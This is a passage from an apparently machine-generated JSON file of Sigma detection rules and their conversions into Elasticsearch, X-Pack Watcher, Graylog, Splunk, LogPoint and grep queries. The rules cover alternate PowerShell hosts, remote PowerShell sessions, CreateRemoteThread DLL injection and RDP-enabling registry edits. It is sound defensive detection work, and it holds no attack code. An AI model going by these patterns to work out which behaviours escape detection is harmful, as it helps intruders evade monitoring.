"name": "Sigma rule"}, {"query": "(EventID:(\"4103\" OR \"400\") AND (NOT (HostApplication:\"powershell.exe\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Alternate-PowerShell-Hosts <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Alternate PowerShell Hosts\",\\n    \"description\": \"Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:(\\\\\"4103\\\\\" OR \\\\\"400\\\\\") AND (NOT (HostApplication:\\\\\"powershell.exe\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4103\\\\\" OR \\\\\"400\\\\\") AND (NOT (HostApplication:\\\\\"powershell.exe\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Alternate PowerShell Hosts\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4103\" \"400\") AND (NOT (HostApplication:\"powershell.exe\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4103\" OR EventID=\"400\") NOT (HostApplication=\"powershell.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id IN [\"4103\", \"400\"]  -(HostApplication=\"powershell.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4103|.*400))(?=.*(?!.*(?:.*(?=.*powershell\\\\.exe)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Remote PowerShell Session\nid: 96b9f619-aa91-478f-bacb-c3e50f8df575\ndescription: Detects remote PowerShell sessions\nstatus: experimental\ndate: 2019/08/10\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/powershell_remote_session.md\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection: \n        EventID:\n            - 4103\n            - 400\n        HostName: 'ServerRemoteHost'\n        HostApplication|contains: 'wsmprovhost.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4103\" OR \"400\") AND HostName:\"ServerRemoteHost\" AND HostApplication.keyword:*wsmprovhost.exe*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Remote-PowerShell-Session <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Remote PowerShell Session\",\\n    \"description\": \"Detects remote PowerShell sessions\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:(\\\\\"4103\\\\\" OR \\\\\"400\\\\\") AND HostName:\\\\\"ServerRemoteHost\\\\\" AND HostApplication.keyword:*wsmprovhost.exe*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4103\\\\\" OR \\\\\"400\\\\\") AND HostName:\\\\\"ServerRemoteHost\\\\\" AND HostApplication.keyword:*wsmprovhost.exe*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Remote PowerShell Session\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4103\" \"400\") AND HostName:\"ServerRemoteHost\" AND HostApplication.keyword:*wsmprovhost.exe*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4103\" OR EventID=\"400\") HostName=\"ServerRemoteHost\" HostApplication=\"*wsmprovhost.exe*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id IN [\"4103\", \"400\"] HostName=\"ServerRemoteHost\" HostApplication=\"*wsmprovhost.exe*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4103|.*400))(?=.*ServerRemoteHost)(?=.*.*wsmprovhost\\\\.exe.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Alternate PowerShell Hosts\nid: f67f6c57-257d-4919-a416-69cd31f9aac3\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/alternate_signed_powershell_hosts.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 7\n        Description: 'system.management.automation'\n        ImageLoaded|contains: 'system.management.automation'\n    filter:\n        Image|endswith: '\\powershell.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"7\" AND Description:\"system.management.automation\" AND ImageLoaded.keyword:*system.management.automation*) AND (NOT (Image.keyword:*\\\\\\\\powershell.exe)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Alternate-PowerShell-Hosts <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Alternate PowerShell Hosts\",\\n    \"description\": \"Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\",\\n    \"tags\": \"\",\\n    \"query\": \"((EventID:\\\\\"7\\\\\" AND Description:\\\\\"system.management.automation\\\\\" AND ImageLoaded.keyword:*system.management.automation*) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"7\\\\\" AND Description:\\\\\"system.management.automation\\\\\" AND ImageLoaded.keyword:*system.management.automation*) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Alternate PowerShell Hosts\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"7\" AND Description:\"system.management.automation\" AND ImageLoaded.keyword:*system.management.automation*) AND (NOT (Image.keyword:*\\\\\\\\powershell.exe)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"7\" Description=\"system.management.automation\" ImageLoaded=\"*system.management.automation*\") NOT (Image=\"*\\\\\\\\powershell.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"7\" Description=\"system.management.automation\" ImageLoaded=\"*system.management.automation*\")  -(Image=\"*\\\\\\\\powershell.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*7)(?=.*system\\\\.management\\\\.automation)(?=.*.*system\\\\.management\\\\.automation.*)))(?=.*(?!.*(?:.*(?=.*.*\\\\powershell\\\\.exe)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Alternate PowerShell Hosts\nid: 58cb02d5-78ce-4692-b3e1-dce850aae41a\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/alternate_signed_powershell_hosts.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 17\n        PipeName|startswith: '\\PSHost'\n    filter:\n        Image|startswith: '\\powershell.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"17\" AND PipeName.keyword:\\\\\\\\PSHost*) AND (NOT (Image.keyword:\\\\\\\\powershell.exe*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Alternate-PowerShell-Hosts <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Alternate PowerShell Hosts\",\\n    \"description\": \"Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\",\\n    \"tags\": \"\",\\n    \"query\": \"((EventID:\\\\\"17\\\\\" AND PipeName.keyword:\\\\\\\\\\\\\\\\PSHost*) AND (NOT (Image.keyword:\\\\\\\\\\\\\\\\powershell.exe*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"17\\\\\" AND PipeName.keyword:\\\\\\\\\\\\\\\\PSHost*) AND (NOT (Image.keyword:\\\\\\\\\\\\\\\\powershell.exe*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Alternate PowerShell Hosts\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"17\" AND PipeName.keyword:\\\\\\\\PSHost*) AND (NOT (Image.keyword:\\\\\\\\powershell.exe*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"17\" PipeName=\"\\\\\\\\PSHost*\") NOT (Image=\"\\\\\\\\powershell.exe*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"17\" PipeName=\"\\\\\\\\PSHost*\")  -(Image=\"\\\\\\\\powershell.exe*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*17)(?=.*\\\\PSHost.*)))(?=.*(?!.*(?:.*(?=.*\\\\powershell\\\\.exe.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1055 CreateRemoteThread API and LoadLibrary\nid: 052ec6f6-1adc-41e6-907a-f1c813478bee\ndescription: Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process\nstatus: experimental\ndate: 2019/08/11\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/05_defense_evasion/T1055_process_injection/dll_injection_createremotethread_loadlibrary.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 8\n        StartModule|endswith: '\\kernel32.dll'\n        StartFunction: 'LoadLibraryA'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"8\" AND StartModule.keyword:*\\\\\\\\kernel32.dll AND StartFunction:\"LoadLibraryA\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1055-CreateRemoteThread-API-and-LoadLibrary <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1055 CreateRemoteThread API and LoadLibrary\",\\n    \"description\": \"Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"8\\\\\" AND StartModule.keyword:*\\\\\\\\\\\\\\\\kernel32.dll AND StartFunction:\\\\\"LoadLibraryA\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"8\\\\\" AND StartModule.keyword:*\\\\\\\\\\\\\\\\kernel32.dll AND StartFunction:\\\\\"LoadLibraryA\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1055 CreateRemoteThread API and LoadLibrary\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"8\" AND StartModule.keyword:*\\\\\\\\kernel32.dll AND StartFunction:\"LoadLibraryA\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"8\" StartModule=\"*\\\\\\\\kernel32.dll\" StartFunction=\"LoadLibraryA\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"8\" StartModule=\"*\\\\\\\\kernel32.dll\" StartFunction=\"LoadLibraryA\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*8)(?=.*.*\\\\kernel32\\\\.dll)(?=.*LoadLibraryA))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 PowerShell Execution\nid: 867613fb-fa60-4497-a017-a82df74a172c\ndescription: Detects execution of PowerShell\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/basic_powershell_execution.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 7\n        Description: 'system.management.automation'\n        ImageLoaded|contains: 'system.management.automation'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7\" AND Description:\"system.management.automation\" AND ImageLoaded.keyword:*system.management.automation*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-PowerShell-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 PowerShell Execution\",\\n    \"description\": \"Detects execution of PowerShell\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"7\\\\\" AND Description:\\\\\"system.management.automation\\\\\" AND ImageLoaded.keyword:*system.management.automation*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7\\\\\" AND Description:\\\\\"system.management.automation\\\\\" AND ImageLoaded.keyword:*system.management.automation*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 PowerShell Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7\" AND Description:\"system.management.automation\" AND ImageLoaded.keyword:*system.management.automation*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7\" Description=\"system.management.automation\" ImageLoaded=\"*system.management.automation*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"7\" Description=\"system.management.automation\" ImageLoaded=\"*system.management.automation*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7)(?=.*system\\\\.management\\\\.automation)(?=.*.*system\\\\.management\\\\.automation.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 PowerShell Execution\nid: d32b53ce-2a41-4db0-a42a-fb574d819d97\ndescription: Detects execution of PowerShell\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/basic_powershell_execution.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 17\n        PipeName|startswith: '\\PSHost'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"17\" AND PipeName.keyword:\\\\\\\\PSHost*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-PowerShell-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 PowerShell Execution\",\\n    \"description\": \"Detects execution of PowerShell\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"17\\\\\" AND PipeName.keyword:\\\\\\\\\\\\\\\\PSHost*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"17\\\\\" AND PipeName.keyword:\\\\\\\\\\\\\\\\PSHost*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 PowerShell Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"17\" AND PipeName.keyword:\\\\\\\\PSHost*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"17\" PipeName=\"\\\\\\\\PSHost*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"17\" PipeName=\"\\\\\\\\PSHost*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*17)(?=.*\\\\PSHost.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1112 RDP Registry Modification\nid: 41904ebe-d56c-4904-b9ad-7a77bdf154b3\ndescription: Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections.\nstatus: experimental\ndate: 2019/09/12\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/05_defense_evasion/T1112_Modify_Registry/enable_rdp_registry.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject|endswith:\n            - '\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\UserAuthentication'\n            - '\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal\\\\ Server\\\\\\\\WinStations\\\\\\\\RDP\\\\-Tcp\\\\\\\\UserAuthentication OR *\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal\\\\ Server\\\\\\\\fDenyTSConnections) AND Details:\"DWORD\\\\ \\\\(0x00000000\\\\)\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1112-RDP-Registry-Modification <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1112 RDP Registry Modification\",\\n    \"description\": \"Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections.\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\WinStations\\\\\\\\\\\\\\\\RDP\\\\\\\\-Tcp\\\\\\\\\\\\\\\\UserAuthentication OR *\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\fDenyTSConnections) AND Details:\\\\\"DWORD\\\\\\\\ \\\\\\\\(0x00000000\\\\\\\\)\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\WinStations\\\\\\\\\\\\\\\\RDP\\\\\\\\-Tcp\\\\\\\\\\\\\\\\UserAuthentication OR *\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\fDenyTSConnections) AND Details:\\\\\"DWORD\\\\\\\\ \\\\\\\\(0x00000000\\\\\\\\)\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1112 RDP Registry Modification\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\WinStations\\\\\\\\RDP\\\\-Tcp\\\\\\\\UserAuthentication *\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fDenyTSConnections) AND Details:\"DWORD \\\\(0x00000000\\\\)\")", "product": "Atomic 